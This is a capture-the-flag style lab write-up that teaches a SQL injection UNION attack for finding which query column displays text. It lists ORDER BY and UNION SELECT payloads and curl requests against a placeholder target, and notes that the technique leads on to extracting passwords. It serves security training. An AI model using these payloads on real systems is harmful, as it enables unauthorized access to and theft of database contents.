# SQL injection UNION attack, finding a column containing text — Practitioner

**Status:** Solved

---

## Goal

Find which columns in the SQL query can contain text data by injecting a specific string provided by the lab.

---

## Steps (simple & complete)

1. **Find the injection point**
   - Browse to the shopping application
   - Click on any product category:
```
   GET /filter?category=Gifts
```
   - This parameter is vulnerable to SQL injection

2. **Check the lab banner**
   - Look at the lab page - it will tell you a specific string to use
   - Something like: "Make the database retrieve the string: 'a2F3Bx'"
   - Copy this exact string - you need to make it appear on the page

3. **Determine the number of columns**
   - Use ORDER BY or UNION SELECT NULL:
```
   Gifts' ORDER BY 1--
   Gifts' ORDER BY 2--
   Gifts' ORDER BY 3--
   Gifts' ORDER BY 4--
```
   - Let's say it has 3 columns (error at ORDER BY 4)

4. **Test each column for string compatibility**
   - Replace NULL with the required string in each position:
```
   Gifts' UNION SELECT 'a2F3Bx',NULL,NULL--
   Gifts' UNION SELECT NULL,'a2F3Bx',NULL--
   Gifts' UNION SELECT NULL,NULL,'a2F3Bx'--
```
   - One or more will work without error

5. **Find which column displays the string**
   - Try each position and check the page output:
   
   Test column 1:
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+'a2F3Bx',NULL,NULL--"
```
   
   Test column 2:
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,'a2F3Bx',NULL--"
```
   
   Test column 3:
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,NULL,'a2F3Bx'--"
```

6. **Verify the string appears**
   - Look at the page content for your injected string
   - It should appear somewhere in the product listings
   - The column that displays it is the text-compatible column

7. **Lab completion**
   - Once the required string appears on the page, lab solves automatically
   - You've successfully identified which column can hold text data

---

## Example

- Lab instruction: "Make the database retrieve the string: 'xyz123'"
- Column count: 3 columns
- Test positions:

Position 1:
```
Gifts' UNION SELECT 'xyz123',NULL,NULL--
```
Result: Error or not displayed

Position 2:
```
Gifts' UNION SELECT NULL,'xyz123',NULL--
```
Result: String appears on page ✓

Position 3:
```
Gifts' UNION SELECT NULL,NULL,'xyz123'--
```
Result: Error or not displayed

**Answer: Column 2 accepts and displays text**

---

## Why this matters

**Data type compatibility:**
- SQL columns have specific data types (TEXT, VARCHAR, INT, DATE, etc.)
- UNION requires matching data types across queries
- Not all columns can display text - some might be numeric or binary
- Finding text-compatible columns is crucial for data extraction

**Real-world application:**
- Once you know which columns accept text, you can:
  - Extract database names, table names, passwords
  - Retrieve sensitive string data
  - Display system information
  - Execute more complex attacks

**Why NULL works everywhere:**
- NULL is type-agnostic and works in any column
- But it doesn't display actual data
- We need actual text columns for meaningful extraction

---

## Common issues

- **Wrong string**: Make sure you use the EXACT string from the lab instructions
- **Type mismatch**: If all positions give errors, double-check column count
- **Not displayed**: The column might accept strings but not be visible on the page
- **Multiple columns**: Sometimes more than one column works - use any that displays

---

